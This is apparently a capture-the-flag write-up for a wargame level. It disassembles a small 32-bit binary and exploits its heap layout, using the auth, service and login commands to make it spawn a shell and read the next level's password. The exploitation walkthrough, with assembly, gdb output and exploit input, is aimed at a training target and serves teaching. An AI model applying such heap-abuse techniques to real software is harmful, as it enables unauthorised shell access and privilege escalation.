# HEAP BUFFER OVERFLOW (YES, AGAIN) BUT THIS TIME IT'S INTERACTIVE 🤓

```asm
08048564 <main>:
 8048564:	55                   	push   ebp
 8048565:	89 e5                	mov    ebp,esp
 8048567:	57                   	push   edi
 8048568:	56                   	push   esi
 8048569:	83 e4 f0             	and    esp,0xfffffff0
 804856c:	81 ec a0 00 00 00    	sub    esp,0xa0
 8048572:	eb 01                	jmp    8048575 <main+0x11>
 8048574:	90                   	nop
 8048575:	8b 0d b0 9a 04 08    	mov    ecx,DWORD PTR ds:0x8049ab0
 804857b:	8b 15 ac 9a 04 08    	mov    edx,DWORD PTR ds:0x8049aac
 8048581:	b8 10 88 04 08       	mov    eax,0x8048810
 8048586:	89 4c 24 08          	mov    DWORD PTR [esp+0x8],ecx
 804858a:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 804858e:	89 04 24             	mov    DWORD PTR [esp],eax
 8048591:	e8 7a fe ff ff       	call   8048410 <printf@plt>
 8048596:	a1 80 9a 04 08       	mov    eax,ds:0x8049a80
 804859b:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 804859f:	c7 44 24 04 80 00 00 	mov    DWORD PTR [esp+0x4],0x80
 80485a6:	00 
 80485a7:	8d 44 24 20          	lea    eax,[esp+0x20]
 80485ab:	89 04 24             	mov    DWORD PTR [esp],eax
 80485ae:	e8 8d fe ff ff       	call   8048440 <fgets@plt>
```
- A buffer is created on the stack and is filling with our input with fgets. Its size is 0x80 (128 in decimal).
- 2 global variables are used (0x8049ab0 and 0x8049aac), they're pointers, their values (addresses) get printed


```asm
 8048656:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
```
This instruction is asm builtin for 2 strings comparison

```
(gdb) p (char*) 0x8048819
$1 = 0x8048819 "auth "
(gdb) p (char*) 0x804881f
$2 = 0x804881f "reset"
(gdb) p (char*) 0x8048825
$3 = 0x8048825 "service"
(gdb) p (char*) 0x804882d
$4 = 0x804882d "login"
```

```asm
 80485c1:	b8 19 88 04 08       	mov    eax,0x8048819
 80485c6:	b9 05 00 00 00       	mov    ecx,0x5
 80485cb:	89 d6                	mov    esi,edx
 80485cd:	89 c7                	mov    edi,eax
 80485cf:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 ...
 8048648:	b8 1f 88 04 08       	mov    eax,0x804881f
 804864d:	b9 05 00 00 00       	mov    ecx,0x5
 8048652:	89 d6                	mov    esi,edx
 8048654:	89 c7                	mov    edi,eax
 8048656:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 ...
 804867e:	b8 25 88 04 08       	mov    eax,0x8048825
 8048683:	b9 06 00 00 00       	mov    ecx,0x6
 8048688:	89 d6                	mov    esi,edx
 804868a:	89 c7                	mov    edi,eax
 804868c:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 ...
 80486bb:	b8 2d 88 04 08       	mov    eax,0x804882d
 80486c0:	b9 05 00 00 00       	mov    ecx,0x5
 80486c5:	89 d6                	mov    esi,edx
 80486c7:	89 c7                	mov    edi,eax
 80486c9:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 ...
```
The buffer gets compared to 4 strings : "auth ", "reset", "service" and "login". Lets see what happends in every cases

```asm
80486c9:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 80486cb:	0f 97 c2             	seta   dl
 80486ce:	0f 92 c0             	setb   al
 80486d1:	89 d1                	mov    ecx,edx
 80486d3:	28 c1                	sub    cl,al
 80486d5:	89 c8                	mov    eax,ecx
 80486d7:	0f be c0             	movsx  eax,al
 80486da:	85 c0                	test   eax,eax
 80486dc:	0f 85 92 fe ff ff    	jne    8048574 <main+0x10>
 80486e2:	a1 ac 9a 04 08       	mov    eax,ds:0x8049aac
 80486e7:	8b 40 20             	mov    eax,DWORD PTR [eax+0x20]
 80486ea:	85 c0                	test   eax,eax
 80486ec:	74 11                	je     80486ff <main+0x19b>
 80486ee:	c7 04 24 33 88 04 08 	mov    DWORD PTR [esp],0x8048833
 80486f5:	e8 86 fd ff ff       	call   8048480 <system@plt>
```
```
(gdb) p (char*) 0x8048833
$1 = 0x8048833 "/bin/sh"
```
In the last comparison, if buffer == "login", the program opens a shell if 0x8049aac contains an address to a string with a 32th character not null. But where the 0x8049aac pointer is set ?

```asm
 80485cf:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 80485d1:	0f 97 c2             	seta   dl
 80485d4:	0f 92 c0             	setb   al
 80485d7:	89 d1                	mov    ecx,edx
 80485d9:	28 c1                	sub    cl,al
 80485db:	89 c8                	mov    eax,ecx
 80485dd:	0f be c0             	movsx  eax,al
 80485e0:	85 c0                	test   eax,eax
 80485e2:	75 5e                	jne    8048642 <main+0xde>
 80485e4:	c7 04 24 04 00 00 00 	mov    DWORD PTR [esp],0x4
 80485eb:	e8 80 fe ff ff       	call   8048470 <malloc@plt>
 80485f0:	a3 ac 9a 04 08       	mov    ds:0x8049aac,eax
 80485f5:	a1 ac 9a 04 08       	mov    eax,ds:0x8049aac
 80485fa:	c7 00 00 00 00 00    	mov    DWORD PTR [eax],0x0
 8048600:	8d 44 24 20          	lea    eax,[esp+0x20]
 8048604:	83 c0 05             	add    eax,0x5
 8048607:	c7 44 24 1c ff ff ff 	mov    DWORD PTR [esp+0x1c],0xffffffff
 804860e:	ff 
 804860f:	89 c2                	mov    edx,eax
 8048611:	b8 00 00 00 00       	mov    eax,0x0
 8048616:	8b 4c 24 1c          	mov    ecx,DWORD PTR [esp+0x1c]
 804861a:	89 d7                	mov    edi,edx
 804861c:	f2 ae                	repnz scas al,BYTE PTR es:[edi]
 804861e:	89 c8                	mov    eax,ecx
 8048620:	f7 d0                	not    eax
 8048622:	83 e8 01             	sub    eax,0x1
 8048625:	83 f8 1e             	cmp    eax,0x1e
 8048628:	77 18                	ja     8048642 <main+0xde>
 804862a:	8d 44 24 20          	lea    eax,[esp+0x20]
 804862e:	8d 50 05             	lea    edx,[eax+0x5]
 8048631:	a1 ac 9a 04 08       	mov    eax,ds:0x8049aac
 8048636:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 804863a:	89 04 24             	mov    DWORD PTR [esp],eax
 804863d:	e8 1e fe ff ff       	call   8048460 <strcpy@plt>
```
The 0x8049aac pointer is set to the address of a 4-bytes buffer allocated on the heap, in the "auth" condition. Then a strncpy is done from the input buffer (after " auth ") to this allocated buffer, but the copy length in bytes is max 0x1e (30 in decimal). We need to find another way to write a non-null byte at its 32th byte

```asm
 804868c:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 804868e:	0f 97 c2             	seta   dl
 8048691:	0f 92 c0             	setb   al
 8048694:	89 d1                	mov    ecx,edx
 8048696:	28 c1                	sub    cl,al
 8048698:	89 c8                	mov    eax,ecx
 804869a:	0f be c0             	movsx  eax,al
 804869d:	85 c0                	test   eax,eax
 804869f:	75 14                	jne    80486b5 <main+0x151>
 80486a1:	8d 44 24 20          	lea    eax,[esp+0x20]
 80486a5:	83 c0 07             	add    eax,0x7
 80486a8:	89 04 24             	mov    DWORD PTR [esp],eax
 80486ab:	e8 80 fd ff ff       	call   8048430 <strdup@plt>
```
In the 3th comparison, if buffer == "service", its doing a new malloc (strdup function) and it stores it at 0x8049ab0. So if we first set the auth, then put "service", it can hopefully write a non-null byte at the 32th byte of the allocated buffer for "auth" and then we can put "login" to get a shell

```
~$ ./level8 
(nil), (nil) 
auth 12345678901234567890123456789
0x804a008, (nil) 
service1111111111111111111111111111111111
0x804a008, 0x804a018 
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
